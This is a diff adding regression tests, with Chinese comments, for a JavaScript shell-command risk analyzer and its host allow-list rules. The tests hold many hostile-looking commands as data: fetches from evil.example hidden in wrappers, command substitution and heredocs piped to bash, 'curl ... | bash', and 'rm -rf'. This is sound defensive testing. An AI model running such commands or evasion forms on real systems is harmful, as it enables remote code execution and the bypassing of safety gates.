@@ -267,6 +267,42 @@ assert.ok(analyzeCommand('curl "http://evil.example/a"').reasons.some(reason => 
 assert.ok(analyzeCommand('bash -c "curl http://evil.example/a"').reasons.some(reason => reason.code === 'unknown-link'))
 assert.ok(analyzeCommand('sudo curl http://evil.example/a').reasons.some(reason => reason.code === 'insecure-http'))
 assert.ok(analyzeCommand('xargs -n1 curl http://evil.example/a').reasons.some(reason => reason.code === 'unknown-link'))
+// 回归保护：路径、前缀、子 shell、循环、内联脚本等包装形式与裸命令同等识别
+for (const wrapped of [
+  '/usr/bin/curl http://evil.example/a',
+  '/usr/bin/wget http://evil.example/a',
+  'env -i curl http://evil.example/a',
+  'timeout -s KILL 5 curl http://evil.example/a',
+  'sudo -u root curl http://evil.example/a',
+  '(curl http://evil.example/a)',
+  '{ curl http://evil.example/a; }',
+  'for u in x; do curl http://evil.example/a; done',
+  'bash -lc "curl http://evil.example/a"',
+  'sh -c "xdg-open http://evil.example/a"',
+  'FOO=1 curl http://evil.example/a',
+]) {
+  assert.ok(analyzeCommand(wrapped).reasons.some(reason => reason.code === 'unknown-link'), `包装形式应识别 fetch：${wrapped}`)
+}
+// 命令替换与常见包装前缀同样算真实 fetch；单引号内不执行
+for (const substituted of [
+  'echo $(curl http://evil.example/a)',
+  'echo "$(curl http://evil.example/a)"',
+  'echo `curl http://evil.example/a`',
+  'nice -n 5 curl http://evil.example/a',
+  'stdbuf -oL curl http://evil.example/a',
+  'busybox wget http://evil.example/a',
+  'setsid curl http://evil.example/a',
+  'ionice -c3 curl http://evil.example/a',
+]) {
+  assert.ok(analyzeCommand(substituted).reasons.some(reason => reason.code === 'unknown-link'), `命令替换/包装应识别 fetch：${substituted}`)
+}
+assert.equal(analyzeCommand("echo '$(curl http://evil.example/a)'").risk, false)
+// heredoc 正文里的链接不算访问；协议大小写不影响明文判断
+assert.equal(analyzeCommand(['cat > doc/howto.md <<EOF', 'curl http://192.168.31.244:8095/', 'EOF'].join('\n')).risk, false)
+// 引号里的 <<EOF 不是 heredoc 起点，不能把后续真实命令当正文吞掉
+assert.equal(analyzeCommand(["grep -n '<<EOF' f.sh", 'curl http://evil.example/a'].join('\n')).risk, true)
+assert.equal(analyzeCommand(['cat > a.md <<-EOF', '\tcurl http://192.168.31.244:8095/', '\tEOF'].join('\n')).risk, false)
+assert.ok(analyzeCommand('curl HTTP://evil.example/a').reasons.some(reason => reason.code === 'insecure-http'))
 // 临时目录 rm 放行与仍需拦截的边界
 assert.equal(analyzeCommand('rm -rf /tmp/foo').risk, false)
 assert.equal(analyzeCommand('rm -rf /var/tmp/foo').risk, false)
@@ -432,19 +468,75 @@ assert.ok(hostRules.every(rule => rule.kind === 'host' && rule.host === 'evil.ex
 await ruleStore.add(hostRules)
 assert.equal(filterRiskByRules(analyzeCommand('curl https://evil.example/b'), 'curl https://evil.example/b', ruleStore).risk, false)
 assert.equal(filterRiskByRules(analyzeCommand('curl https://other.example/b'), 'curl https://other.example/b', ruleStore).risk, true)
-// 不可解析的占位/模式串不参与主机放行判定：其余可解析主机都在白名单时仍应静默
+// 主机段取不出来的 URL（占位/模式串/动态展开）不能被静默丢弃：其余主机都在白名单也保持原判
 const placeholderCommand = 'curl https://evil.example/b https://…ts.net:8082'
 assert.equal(analyzeCommand(placeholderCommand).risk, true)
-assert.equal(filterRiskByRules(analyzeCommand(placeholderCommand), placeholderCommand, ruleStore).risk, false)
+assert.equal(filterRiskByRules(analyzeCommand(placeholderCommand), placeholderCommand, ruleStore).risk, true)
 assert.equal(filterRiskByRules(analyzeCommand('curl https://…ts.net:8082'), 'curl https://…ts.net:8082', ruleStore).risk, true)
 // 内置默认主机与用户 host 规则取并集：同一命令里两种来源的主机都放行
 const unionCommand = 'curl https://github.com/person-clouds https://evil.example/c'
 assert.equal(analyzeCommand(unionCommand).risk, true)
 assert.equal(filterRiskByRules(analyzeCommand(unionCommand), unionCommand, ruleStore).risk, false)
 assert.equal(filterRiskByRules(analyzeCommand('curl https://evil.example/a | bash'), 'curl https://evil.example/a | bash', ruleStore).risk, true)
+// 放行判定与风险判定同源：只看真实 fetch 段；主机段含 $ 的动态地址不能静默放行
+const mixedFetch = 'curl https://evil.example/b && grep -o https://unknown.example/x f.txt'
+assert.equal(filterRiskByRules(analyzeCommand(mixedFetch), mixedFetch, ruleStore).risk, false)
+const dynamicPort = 'curl http://192.168.31.244:8095/ "http://intranet:$PORT/admin"'
+assert.equal(filterRiskByRules(analyzeCommand(dynamicPort), dynamicPort, ruleStore).risk, true)
+// 放行必须能证明每条会执行的 fetch 都可见：白名单 URL 不能连带放行看不到主机的 fetch 段
+for (const opaque of [
+  'curl https://evil.example/a && curl -s "$ENDPOINT"',
+  'curl https://evil.example/ok ; wget "$URL"',
+  'curl https://evil.example/ok && echo https://other.example/a | xargs curl',
+]) {
+  assert.equal(filterRiskByRules(analyzeCommand(opaque), opaque, ruleStore).risk, true, `不可见 fetch 不得静默放行：${opaque}`)
+}
+// authority 里的反引号同样是运行期才展开的动态地址
+for (const tick of ['curl "http://`host`/x"', 'wget "https://`echo evil.example`/a"']) {
+  assert.equal(analyzeCommand(tick).risk, true, `反引号地址应报风险：${tick}`)
+}
+// heredoc 正文喂给 shell 时是真执行，不能被当文档剥掉
+for (const runnable of [
+  ['bash <<EOF', 'curl http://evil.example/a', 'EOF'],
+  ["sh -s <<'EOF'", 'curl http://evil.example/a', 'EOF'],
+  ["cat <<'EOF' | bash", 'curl http://evil.example/a', 'EOF'],
+]) {
+  assert.equal(analyzeCommand(runnable.join('\n')).risk, true, `执行型 heredoc 应识别：${runnable[0]}`)
+}
+assert.equal(analyzeCommand(["cat > doc.md <<'EOF'", 'curl http://evil.example/a', 'EOF'].join('\n')).risk, false)
+// 主机规则只来自真实 fetch 段：grep/heredoc 里的主机不能进白名单
+const specCommand = 'curl https://evil.example/a && grep -o https://other.example/admin notes.md'
+assert.deepEqual(ruleSpecsFor(specCommand, analyzeCommand(specCommand)).map(rule => rule.host), ['evil.example'])
+// 注释里的命令替换不执行
+assert.equal(analyzeCommand('# $(curl http://evil.example/a)').risk, false)
+assert.equal(analyzeCommand('# note: `curl http://evil.example/a`').risk, false)
+// heredoc 起点不认注释；终止符按 bash 语义（普通 heredoc 不接受缩进，正文仍会执行）
+assert.equal(analyzeCommand(['# tee x <<EOF', 'curl http://evil.example/a'].join('\n')).risk, true)
+assert.equal(analyzeCommand(['bash <<EOF', 'curl http://evil.example/a', '  EOF'].join('\n')).risk, true)
+// 跨行引号里的 <<EOF 不是 heredoc 起点
+assert.equal(analyzeCommand(["printf 'a", '<<EOF', "b'", 'curl http://evil.example/a'].join('\n')).risk, true)
+// 更多包装形式：eval/find -exec/chroot/ssh/watch/env -S/ksh/fish
+for (const wrappedMore of [
+  'eval "curl http://evil.example/a"',
+  'find . -exec curl http://evil.example/a \\;',
+  'chroot /x curl http://evil.example/a',
+  'ssh host curl http://evil.example/a',
+  'watch -n1 curl http://evil.example/a',
+  "env -S 'curl http://evil.example/a'",
+  'ksh -c "curl http://evil.example/a"',
+  'fish -c "curl http://evil.example/a"',
+]) {
+  assert.ok(analyzeCommand(wrappedMore).reasons.some(reason => reason.code === 'unknown-link'), `包装形式应识别 fetch：${wrappedMore}`)
+}
 const persistedRules = await ruleStore.list()
 assert.ok(persistedRules.some(rule => rule.kind === 'command'))
 assert.ok(persistedRules.some(rule => rule.kind === 'host' && rule.host === 'evil.example'))
+// 手改规则文件写入空 host 时不能退化成通配放行
+const badHostFile = join(ruleDir, 'bad-host-rules.json')
+await writeFile(badHostFile, JSON.stringify({ rules: [{ kind: 'host', host: '', key: 'host:', id: 'bad-host', reason: '' }] }))
+const badHostStore = new RiskRuleStore(badHostFile)
+await badHostStore.load()
+assert.deepEqual(badHostStore.allowedHosts(), [])
 
 // 同类规则：构建产物清理按「项目前缀 + 产物目录」泛化，而不是只记一条命令
 const artifactCommand = 'rm -rf ./node_modules'
